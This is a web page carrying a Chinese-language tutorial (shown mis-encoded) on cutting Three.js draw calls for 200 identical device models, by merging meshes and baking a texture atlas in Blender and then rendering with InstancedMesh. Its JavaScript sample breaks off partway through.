                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><em>å‰è¨€ï¼š200ä¸ªè®¾å¤‡çš„æ„Ÿäººå¸§ç‡ï¼Œå½“æˆ‘æ­£åœ¨ä¸ºè‡ªå·±åˆšç»˜åˆ¶å¥½çš„ç«™æˆ¿è®¾å¤‡æ¬£å–œæ—¶ï¼Œå´æ²¡å‘ç°ï¼ŒçœŸæ­£çš„å™©æ¢¦æ‰åˆšåˆšå¼€å§‹ï¼Œæ¸²æŸ“çš„å¸§ç‡è¿10éƒ½ç ´ä¸äº†ï¼Œæ•´ä¸ªåœºæ™¯ä¸èƒ½ç”¨å¡æ¥å½¢å®¹äº†ï¼Œå› ä¸ºå·²ç»ä¸èƒ½ç®—æ˜¯åŠ¨æ€é¡µé¢äº†ï¼Œè·Ÿé™æ€é¡µé¢ç›¸å·®æ— å‡ ï¼Œçœ‹ç€è¿™æ„Ÿäººçš„å¸§ç‡ï¼Œæˆ‘æœ€ç»ˆè¸ä¸Šäº†æ€§èƒ½ä¼˜åŒ–çš„é“è·¯...</em></p>
<p>å¦‚æœæœ‰å°ä¼™ä¼´çœ‹è¿‡æˆ‘ä¹‹å‰çš„ä¸€ç¯‡æ€§èƒ½ä¼˜åŒ–æ–‡ç«  <a href="https://juejin.cn/post/7601075423002984484" target="_blank" title="https://juejin.cn/post/7601075423002984484">ã€ThreeJSã€‘InstancedMesh å®æˆ˜ï¼šä»20000ä¸ªMeshåˆ°1ä¸ªDraw Call</a>
åº”è¯¥å°±çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¹ˆå¡ï¼Œæ²¡é”™ï¼Œè¿˜æ˜¯DrawCallçš„é—®é¢˜ã€‚é‚£ä¸ºä»€ä¹ˆåŒºåŒº200ä¸ªè®¾å¤‡ï¼Œå°±èƒ½è®©æˆ‘çš„åœºæ™¯å˜æˆPPTå‘¢ï¼Ÿé‚£æ˜¯å› ä¸º<strong>æ¨¡å‹æ–‡ä»¶å¯¼å…¥Three.jsåï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªGroupå¯¹è±¡ï¼Œé‡Œé¢å¡æ»¡äº†å‡ åä¸Šç™¾ä¸ªMeshå­å¯¹è±¡</strong>ã€‚æ™®é€šçš„ä¸€ä¸ªMeshä¸€å¸§è°ƒç”¨ä¸€æ¬¡DrawCallï¼Œä½†ä¸€ä¸ªå¤æ‚æ¨¡å‹å¯èƒ½ç”±ä¸Šç™¾ä¸ªMeshç»„æˆï¼Œç›¸å½“äºä¸€ä¸ª"Meshå¤§ç¤¼åŒ…"ã€‚æˆ‘è¿™200ä¸ªè®¾å¤‡ï¼Œæ¯ä¸ªéƒ½æœ‰260ä¸ªMeshï¼Œæ€»å…±52000ä¸ªMeshï¼Œæ¯ä¸€å¸§ç»˜åˆ¶éƒ½è¦è°ƒç”¨52000æ¬¡DrawCallï¼ŒCPUç›´æ¥å¹²å†’çƒŸäº†ï¼Œä½ è¯´è¿™ä¸å¡æ‰æ€ªäº†ã€‚ã€‚</p>
<p>ä»¥ä¸‹æ˜¯å½“å‰å¸§ç‡ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ca9d67a5ec141529e53eb5000a4f56e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=o%2FaCOkjoFCnljqDrBRZZ5sdOzFI%3D" alt="threejs-test - Google Chrome 2026-02-03 22-50-32.gif" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°å¡å‡ºç¿”æ¥äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¼€å§‹è¿›å…¥ä»Šå¤©çš„æ­£é¢˜ï¼Œæ€ä¹ˆæŠŠè¿™ä¹ˆå¤šçš„DrawCallï¼Œä¼˜åŒ–åˆ°è·Ÿå¾·èŠ™ä¸€æ ·ä¸æ»‘~(å¾·èŠ™æ‰“é’±...)</p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ”¶é›†ä¿¡æ¯åˆ¤æ–­ç“¶é¢ˆã€‚æˆ‘ç›®å‰çš„åœºæ™¯ä¸Šæœ‰52000ä¸ªMeshï¼Œ200ä¸ªæ¨¡å‹ä»¥åŠ52000æ¬¡DrawCallï¼Œæ˜æ˜¾æ˜¯<strong>CPUç«¯çš„DrawCallæäº¤ç“¶é¢ˆ</strong>ï¼ˆæµè§ˆå™¨æ¯å¸§å»ºè®®æ§åˆ¶åœ¨1000æ¬¡ä»¥å†…ï¼‰ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠè¿™52000ä¸ªMeshåˆå¹¶æˆå°½å¯èƒ½å°‘çš„DrawCallã€‚</p>
<h2 data-id="heading-0">ç¬¬ä¸€æ­¥ï¼šBlenderé¢„å¤„ç†ï¼ˆæ¨¡å‹å‡é¢+çƒ˜ç„™ï¼‰</h2>
<p>ç›®æ ‡æ˜¯æŠŠ260ä¸ªMeshåˆå¹¶æˆ1ä¸ªï¼Œå¹¶æŠŠ14ç§æè´¨çƒ˜ç„™æˆ1å¼ Texture Atlasã€‚</p>
<h3 data-id="heading-1">1. å¯¼å…¥æ¨¡å‹</h3>
<p><code>File</code> â†’ <code>Import</code> â†’ é€‰æ‹©ä½ çš„æ ¼å¼ï¼ˆSTEP/FBX/OBJï¼‰</p>
<h3 data-id="heading-2">2. åˆå¹¶æ‰€æœ‰é›¶ä»¶</h3>
<ul>
<li>æŒ‰ <code>A</code> å…¨é€‰æ‰€æœ‰ç‰©ä½“</li>
<li><code>Ctrl+J</code> åˆå¹¶ä¸ºå•ä¸€ç‰©ä½“</li>
</ul>
<p>æ³¨æ„ï¼šå…¨é€‰åå¦‚æœå³é”®æ²¡æœ‰åˆå¹¶é€‰é¡¹ï¼Œå¯ä»¥æŒ‰ç½‘æ ¼ç±»å‹é€‰æ‹©ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/554ac7e6fbd64b09b1df66cd0b214b45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=abDgkydEoCLXRYtPDDUu2Ec%2BW8U%3D" alt="image.png" loading="lazy"/></p>
<p>ç„¶åå»å³ä¾§å¤§çº²è§†å›¾éšä¾¿å³é”®ä¸ªå½“å‰å·²æ˜¯é€‰ä¸­çŠ¶æ€çš„ç‰©ä½“ï¼Œå†å›åˆ°åœºæ™¯é‡Œå³é”®å°±æœ‰åˆå¹¶é€‰é¡¹äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/560cef05151b4925bd3d03c1fc749d98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=lRdJP1LRWNLezsTOad2JParuPu0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">3. UVé‡æ–°å±•å¼€ï¼ˆå¯é€‰ï¼‰</h3>
<p><strong>è¿™æ˜¯æœ€å®¹æ˜“è¢«å¿½ç•¥ä½†æœ€é‡è¦çš„ä¸€æ­¥ï¼</strong> åˆå¹¶åçš„æ¨¡å‹UVå¦‚æœé‡å åœ¨ä¸€èµ·ï¼Œçƒ˜ç„™å‡ºæ¥çš„è´´å›¾ä¼šä¸€å›¢ç³Ÿã€‚</p>
<ul>
<li>è¿›å…¥ <code>Edit Mode</code>ï¼ˆTabé”®ï¼‰</li>
<li>æŒ‰ <code>A</code> å…¨é€‰é¢</li>
<li>æŒ‰ <code>U</code> â†’ <code>Smart UV Project (æ™ºèƒ½UVæŠ•å°„)</code>ï¼Œç¡®ä¿UV islandsåˆ†å¸ƒåˆç†ä¸”ä¸é‡å </li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a60162bf0ee0490ba1c6ac5e56260da4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=kqqlnLbcwIz12gYLrQM6yvHCQCo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">4. çƒ˜ç„™è´´å›¾ï¼ˆTexture Atlasï¼‰</h3>
<ul>
<li>ç‚¹å‡»é¡¶éƒ¨<code>Shading</code>é€‰é¡¹è¿›å…¥ç€è‰²é¡µé¢ï¼Œæ–°å»ºä¸€ä¸ªå›¾åƒï¼ˆæ¯”å¦‚å«Atlas_2048ï¼‰ï¼Œè¿™å°±æ˜¯çƒ˜ç„™ç›®æ ‡</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d4bc1adc10d4b62b68acb7a95e02f95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=Z3SkXJtf4sReKrjCKrlagFqAZSk%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>ç»™<strong>æ¯ä¸ª</strong>æè´¨æ·»åŠ å›¾åƒçº¹ç†èŠ‚ç‚¹ï¼Œè¿æ¥åˆ°åŸºç¡€è‰²ï¼ˆBase Colorï¼‰ï¼Œå¹¶é€‰ä¸­æ–°å»ºçš„Atlaså›¾åƒ</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ee09a07cf344ff3a9833d889ee6a178~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=SYCjClI8oqRJwt2Ou9Rpk7Zth1g%3D" alt="image.png" loading="lazy"/></p>
<p>é‡å¤æ“ä½œç›´åˆ°æ‰€æœ‰æè´¨ï¼ˆæˆ‘è¿™é‡Œæ˜¯14ä¸ªï¼‰éƒ½è¿ä¸Šäº†Atlaså›¾åƒã€‚çœ‹è¿™é‡Œçš„æ•°å­—ï¼Œæ˜¾ç¤º14å°±ä»£è¡¨14ä¸ªæè´¨å…±äº«è¿™å¼ è´´å›¾ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c5ce0ee6cc84071baf6c4f84691ccd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=lM0TTtMf7%2FKj2gKU%2Bj0mFxxYIUQ%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>åˆ‡æ¢åˆ°<code>Render Properties</code>é¢æ¿ï¼Œé€‰æ‹©<code>Cycles</code>æ¸²æŸ“å™¨ï¼Œçƒ˜ç„™ç±»å‹é€‰<code>Combined</code>ï¼ˆæœ‰é‡‘å±æè´¨ï¼‰æˆ–<code>Diffuse</code>ï¼ˆçº¯æ¼«åå°„ï¼Œè´´å›¾æ›´å°ï¼‰</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d4677607c724632b104ebe886fc3710~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=ue33E4Bml1XcwDM5DvkygdxaTbA%3D" alt="image.png" loading="lazy"/></p>
<p>ç­‰è¿›åº¦æ¡èµ°å®Œï¼Œå¾—åˆ°ä¸€å¼ åˆå¹¶äº†14ç§æè´¨çš„è´´å›¾ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7e6e3d796044d28b60e67931ecae739~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=IR7a1e6t%2ByWVmuXF9q2Im8%2B6BGM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">5. æ¸…ç†æè´¨</h3>
<p>æŠŠä¹‹å‰çš„14ä¸ªæè´¨éƒ½åˆ äº†ï¼Œåªä¿ç•™ä¸€ä¸ªä½¿ç”¨Atlasè´´å›¾çš„æè´¨ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48023a19a9144c088e9b7bb4ef88aae7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=HZmHqF1wc4O8h3nJNqF4m8hiYiQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/777b7b7e836d452186b78e4ceb70921c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=yHfgxcNPjQqkGcnH%2F%2BmkXuyeuzE%3D" alt="image.png" loading="lazy"/></p>
<p>å¯¼å‡ºæ¨¡å‹ï¼Œæ›¿æ¢åˆ°åœºæ™¯çœ‹çœ‹æ•ˆæœï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79a90f54844a47158ac3960535c0a80f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=XBB%2Fpy735EmavOXyF2BiohK77mk%3D" alt="threejs-test - Google Chrome 2026-02-03 22-53-17.gif" loading="lazy"/></p>
<p><strong>è§è¯å¥‡è¿¹ï¼</strong> DrawCallä»52000é™åˆ°äº†200æ¬¡ï¼Œå¸§ç‡ä»ä¸ªä½æ•°å›å‡åˆ°30+ã€‚è¿™æ˜¯å› ä¸ºCPUä¸ç”¨å†ç–¯ç‹‚æäº¤ç»˜åˆ¶æŒ‡ä»¤äº†ï¼Œä½†200æ¬¡DrawCallè¿˜æ˜¯æœ‰ç‚¹å¤šï¼Œæ¯•ç«Ÿæˆ‘ä»¬è¿½æ±‚çš„æ˜¯draw callä¸º1çš„æè‡´ä¸æ»‘~ã€‚</p>
<h2 data-id="heading-6">ç¬¬äºŒæ­¥ï¼šInstancedMesh ç»ˆæä¼˜åŒ–</h2>
<p>ç°åœ¨è¦ç¥­å‡ºå¤§æ€å™¨äº†ã€‚<strong>æ³¨æ„ï¼šè¿™ä¸ªæ–¹æ³•åªé€‚ç”¨äº200ä¸ªè®¾å¤‡æ˜¯ç›¸åŒæ¨¡å‹çš„æƒ…å†µï¼</strong> å¦‚æœæ˜¯200ç§ä¸åŒçš„è®¾å¤‡ï¼ˆæ¯”å¦‚æœ‰ç©ºè°ƒã€æœ‰å˜å‹å™¨ã€æœ‰é…ç”µæŸœï¼‰ï¼Œè¯·çœ‹æ–‡ç« æœ«å°¾çš„"æ–¹æ¡ˆå±€é™ä¸æ›¿ä»£æ–¹æ¡ˆ"ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬çš„æ¨¡å‹åªæœ‰1ä¸ªMesh+1ä¸ªæè´¨ï¼Œå®Œç¾ç¬¦åˆInstancedMeshçš„æ¡ä»¶ã€‚æŠŠ200æ¬¡DrawCallå‹åˆ°1æ¬¡ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76ab427fda18469b9613b9d134edf5ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=DzslCJ54Gvs7APseh2m93m5rKm0%3D" alt="threejs-test - Google Chrome 2026-02-03 23-02-12.gif" loading="lazy"/></p>
<p><strong>200ä¸ªè®¾å¤‡ï¼Œ52000æ¬¡DrawCall â†’ 1æ¬¡DrawCallï¼</strong> GPUé€šè¿‡ç¡¬ä»¶å®ä¾‹åŒ–ç‰¹æ€§ï¼Œä¸€æ¬¡æŒ‡ä»¤æ‰¹é‡æ¸²æŸ“200ä¸ªå‰¯æœ¬ï¼ŒCPUç»ˆäºè§£æ”¾äº†ã€‚</p>
<p>è‡³äºå¸§ç‡ä¸ºä»€ä¹ˆå’Œ200æ¬¡DrawCallæ—¶å·®ä¸å¤šï¼Œæ˜¯å› ä¸ºæµ‹è¯•æœºçš„GPUé¡¶ç‚¹å¤„ç†æˆ–åƒç´ å¡«å……åˆ°äº†ç“¶é¢ˆï¼ˆæˆ‘è¿™é‡Œå°±æ˜¯å› ä¸ºGPUæ»¡è½½äº†ï¼‰ã€‚</p>
<p>ä½†åœ¨ä½ç«¯è®¾å¤‡æˆ–æ›´å¤æ‚åœºæ™¯ä¸‹ï¼Œå‡å°‘DrawCallçš„æ”¶ç›Šè‚¯å®šä¼šéå¸¸æ˜æ˜¾æ»´~ã€‚</p>
<p>ä»¥ä¸‹æ˜¯å®Œæ•´ä»£ç ï¼ˆå¸¦èµ„æºé‡Šæ”¾å’Œå·®å¼‚åŒ–é¢œè‰²ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ---------- åŠ è½½ GLBï¼Œä½¿ç”¨ InstancedMesh æ‰¹é‡æ¸²æŸ“ ----------</span>
<span class="hljs-keyword">const</span> cols = <span class="hljs-number">10</span>;
<span class="hljs-keyword">const</span> rows = <span class="hljs-number">20</span>;
<span class="hljs-keyword">const</span> totalCount = cols * rows;
<span class="hljs-keyword">const</span> spacing = <span class="hljs-number">1.3</span>;
<span class="hljs-keyword">const</span> glbPath = <span class="hljs-string">'/v6.glb'</span>;
<span class="hljs-keyword">const</span> loader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GLTFLoader</span>();

loader.<span class="hljs-title function_">load</span>(glbPath, <span class="hljs-function">(<span class="hljs-params">gltf</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> model = gltf.<span class="hljs-property">scene</span>;

  <span class="hljs-comment">// æ ¹æ®æ¨¡å‹å°ºå¯¸è®¡ç®—ç¼©æ”¾</span>
  <span class="hljs-keyword">const</span> box = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Box3</span>().<span class="hljs-title function_">setFromObject</span>(model);
  <span class="hljs-keyword">const</span> size = box.<span class="hljs-title function_">getSize</span>(<span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>());
  <span class="hljs-keyword">const</span> maxDim = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(size.<span class="hljs-property">x</span>, size.<span class="hljs-property">y</span>, size.<span class="hljs-property">z</span>, <span class="hljs-number">0.001</span>);
  <span class="hljs-keyword">const</span> scale = <span class="hljs-number">0.6</span> / maxDim;

  <span class="hljs-comment">// æå–ç¬¬ä¸€ä¸ªMeshä½œä¸ºå®ä¾‹æ¨¡æ¿ï¼ˆåˆå¹¶åçš„æ¨¡å‹åº”è¯¥åªæœ‰ä¸€ä¸ªMeshï¼‰</span>
  <span class="hljs-keyword">let</span> baseMesh = <span class="hljs-literal">null</span>;
  model.<span class="hljs-title function_">traverse</span>(<span class="hljs-function">(<span class="hljs-params">obj</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-property">isMesh</span>) {
      obj.<span class="hljs-property">castShadow</span> = obj.<span class="hljs-property">receiveShadow</span> = <span class="hljs-literal">true</span>;
      <span class="hljs-keyword">if</span> (!baseMesh) baseMesh = obj;
    }
  });

  <span class="hljs-keyword">if</span> (!baseMesh) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'GLB ä¸­æœªæ‰¾åˆ° Meshï¼Œæ— æ³•åˆ›å»º InstancedMesh'</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// å…‹éš†å‡ ä½•ä½“å’Œæè´¨ï¼ˆé˜²æ­¢å½±å“åŸæ¨¡å‹ï¼‰</span>
  <span class="hljs-keyword">const</span> geometry = baseMesh.<span class="hljs-property">geometry</span>.<span class="hljs-title function_">clone</span>();
  
  <span class="hljs-comment">// é˜²å¾¡æ€§å¤„ç†ï¼šæè´¨å¯èƒ½æ˜¯æ•°ç»„</span>
  <span class="hljs-keyword">const</span> rawMaterial = baseMesh.<span class="hljs-property">material</span>;
  <span class="hljs-keyword">const</span> material = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(rawMaterial) 
    ? rawMaterial[<span class="hljs-number">0</span>].<span class="hljs-title function_">clone</span>() 
    : rawMaterial.<span class="hljs-title function_">clone</span>();

  <span class="hljs-comment">// åˆ›å»º InstancedMesh</span>
  <span class="hljs-keyword">const</span> instancedMesh = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">InstancedMesh</span>(geometry, material, totalCount);
  instancedMesh.<span class="hljs-property">castShadow</span> = <span class="hljs-literal">true</span>;
  instancedMesh.<span class="hljs-property">receiveShadow</span> = <span class="hljs-literal">true</span>;

  <span class="hljs-comment">// è·å–åŸå§‹æ¨¡å‹çš„ä¸–ç•Œæ—‹è½¬ï¼Œä¿æŒæœå‘ä¸€è‡´</span>
  <span class="hljs-keyword">const</span> worldQuat = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Quaternion</span>();
  baseMesh.<span class="hljs-title function_">getWorldQuaternion</span>(worldQuat);

  <span class="hljs-keyword">const</span> dummy = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Object3D</span>();
  <span class="hljs-keyword">const</span> color = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Color</span>();
  <span class="hljs-keyword">let</span> idx = <span class="hljs-number">0</span>;
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; rows; i++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; cols; j++) {
      <span class="hljs-comment">// è®¾ç½®ä½ç½®</span>
      dummy.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(
        (j - cols / <span class="hljs-number">2</span> + <span class="hljs-number">0.5</span>) * spacing,
        <span class="hljs-number">0</span>,
        (i - rows / <span class="hljs-number">2</span> + <span class="hljs-number">0.5</span>) * spacing
      );
      dummy.<span class="hljs-property">quaternion</span>.<span class="hljs-title function_">copy</span>(worldQuat);
      dummy.<span class="hljs-property">scale</span>.<span class="hljs-title function_">set</span>(scale, scale, scale);
      dummy.<span class="hljs-title function_">updateMatrix</span>();
      
      instancedMesh.<span class="hljs-title function_">setMatrixAt</span>(idx, dummy.<span class="hljs-property">matrix</span>);
      
      <span class="hljs-comment">// ç¤ºä¾‹ï¼šç»™ä¸åŒè®¾å¤‡è®¾ç½®ä¸åŒé¢œè‰²ï¼ˆæ¯”å¦‚æ ¹æ®è¿è¡ŒçŠ¶æ€ï¼‰</span>
      <span class="hljs-comment">// å‰100ä¸ªç»¿è‰²ï¼Œå100ä¸ªçº¢è‰²</span>
      <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">100</span>) {
        color.<span class="hljs-title function_">setHex</span>(<span class="hljs-number">0x00ff00</span>);
      } <span class="hljs-keyword">else</span> {
        color.<span class="hljs-title function_">setHex</span>(<span class="hljs-number">0xff0000</span>);
      }
      instancedMesh.<span class="hljs-title function_">setColorAt</span>(idx, color);
      
      idx++;
      <span class="hljs-keyword">if</span> (idx &gt;= totalCount) <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">if</span> (idx &gt;= totalCount) <span class="hljs-keyword">break</span>;
  }
  
  instancedMesh.<span class="hljs-property">instanceMatrix</span>.<span class="hljs-property">needsUpdate</span> = <span class="hljs-literal">true</span>;
  instancedMesh.<span class="hljs-property">instanceColor</span>.<span class="hljs-property">needsUpdate</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// å¦‚æœç”¨äº†setColorAtï¼Œå¿…é¡»è®¾ç½®è¿™ä¸ª</span>
  scene.<span class="hljs-title function_">add</span>(instancedMesh);
  
  <span class="hljs-comment">// é‡Šæ”¾åŸå§‹æ¨¡å‹å ç”¨çš„å†…å­˜ï¼ˆå¾ˆé‡è¦ï¼ï¼‰</span>
  model.<span class="hljs-title function_">traverse</span>(<span class="hljs-function">(<span class="hljs-params">obj</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-property">isMesh</span>) {
      obj.<span class="hljs-property">geometry</span>.<span class="hljs-title function_">dispose</span>();
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(obj.<span class="hljs-property">material</span>)) {
        obj.<span class="hljs-property">material</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.<span class="hljs-title function_">dispose</span>());
      } <span class="hljs-keyword">else</span> {
        obj.<span class="hljs-property">material</span>.<span class="hljs-title function_">dispose</span>();
      }
    }
  });
  
